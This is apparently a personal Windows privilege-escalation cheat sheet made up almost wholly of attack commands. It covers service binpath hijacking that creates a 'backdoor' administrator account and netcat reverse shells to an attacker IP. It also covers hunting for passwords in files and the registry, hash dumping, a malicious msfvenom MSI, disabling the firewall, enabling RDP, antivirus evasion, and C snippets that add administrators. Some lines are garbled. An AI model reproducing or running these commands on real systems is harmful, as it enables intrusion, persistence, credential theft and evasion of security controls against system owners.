Exact OS Version
  $ type C:/Windows/system32/eula.txt

List All Users
  $ net users
 
Network Information
  $ ipconfig /all & route print & arp -a
  
List Open Connections
  $ netstat -atno
  
Windows Services
  $ net start
  $ wmic service list brief
  $ tasklist /SVC
  
Finding Incorrect Permissions in Services

$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

  if wmic is not available :
$ sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

Checking Each Service Manually
  $ cacls "C:\path\to\file.exe"
  $ sc qc upnphost

Exploiting upnohost on windows xp

  $ sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
  sc config upnphost obj= ".\LocalSystem" password= ""
  sc qc upnphost
  
  If fails due to dependency error
  
  $ sc config SSDPSRV start= auto
  net start SSDPSRV
  net start upnphost
  
  Remove Dependency
  $ sc config upnphost depend= ""
  
Accesschk.exe

  use this to find misconfigured keys / services / globals
  
  $ accesschk.exe -uwcqv "Authenticated Users" * /accepteula
  $ accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
  $ accesschk.exe -qdws Users C:\Windows\
  
  Then query the service u found above :
  $ sc qc <vulnerable service name>
  
  Then exploit the service path to execute commands
  
  $ sc config <vuln-service> binpath= "net user backdoor backdoor123 /add"
  $ sc stop <vuln-service>
  $ sc start <vuln$ -service>
  $ sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add"
  $ sc stop <vuln-service>
  $ sc start <vuln-service>
  
  Might have to use depend attribute explicitly
  
  $ sc stop <vuln-service>
  sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
  sc start <vuln-service>
  
  If a service is running as SYSTEM/Administrator with an unquoted path and there are spaces in the path, we can then hijack the path and use it to elevate our privileges.
  
  Command to show affected Services :
  $ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
  
Finding Clear Text Passwords

  $ findstr /si password *.txt
    findstr /si password *.xml
    findstr /si password *.ini

  Strings in config Files
    $ dir /s *pass* == *cred* == *vnc* == *.config*

  All Passwords in all files
    $ findstr /spin "password" *.*
    $ findstr /spin "password" *.*
  
  Common locations
    $ type c:\sysprep.inf
      type c:\sysprep\sysprep.xml
      type c:\unattend.xml
      type %WINDIR%\Panther\Unattend\Unattended.xml
      type %WINDIR%\Panther\Unattended.xml
  
    $ dir c:*vnc.ini /s /b
      dir c:*ultravnc.ini /s /b
      dir c:\ /s /b | findstr /si *vnc.ini
   
   Registry
     $ reg query HKLM /f password /t REG_SZ /s
      reg query HKCU /f password /t REG_SZ /s
      reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
      reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
      reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
      reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
  
     $ reg query HKLM /f password /t REG_SZ /s
       reg query HKCU /f password /t REG_SZ /s
       
Using Hash for Auth
  
    hash Format
    user:group:id:ntlmpassword::

  Utilities for hash dumping
    $ wce32.exe -w
    $ wce64.exe -w
    $ fgdump.exe   
 
  1. Using run-as with hash
    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
  2. $ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
     $ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
     $ computer = "<hostname>"
     [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
       then -
     $ powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1
  3. $ psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc <attacker_ip> 4444 -e cmd.exe"

List listening services on loopback
   $ netstat -ano

SSH for windows - plink.exe
  
  Port Forwarding uing plink.exe
  $ plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
  
  If powershell is block - use 
  https://github.com/Ben0xA/nps

Compiling Windows Exploit in Linux
  
   $ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe

Compiling Python Scripts to executeables

   $ wine ~/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py
   
AlwaysInstallElevated
    
    check if these 2 values are set to "1"
    $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
        if yes! - create your own malicious msi
    $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
    $ msiexec /quiet /qn /i C:\evil.msi

Finding Installed Paths
    $ wmic qfe get Caption,Description,HotFixID,InstalledOn
Windows Kernel Exploits
    https://github.com/SecWiki/windows-kernel-exploits
    
Permissions on a folder recursively

    $ cacls *.* /t /e /g domainname\administrator:f

Enable RDP Access
    reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

Disable Firewall
    $ netsh firewall set opmode disable
    $ netsh advfirewall set allprofiles state off
    
Anti-Virus Bypass
    $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe

Print Proof

    $ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"

Location of SAM File

    C:\\Windows\SYSTEM32\CONFIG

C SUID - exe
 
 #include <stdlib.h>
  int main ()
    {
      int i;
      i = system("net localgroup administrators theusername /add");
      return 0;
    }

  $i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe

Running Arbitrary Command
  
  $ echo -e '#include <stdio.h>\n#include <smain () {\nsystem("C:\\Users\\Administrator\\Desktop\\nc -lvp 4313 -e cmd.exe");\nreturn(0);\n}'> poc.c












     






















  
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
  
  
  
  
  
  
  
  
  
  
  
  
  
  
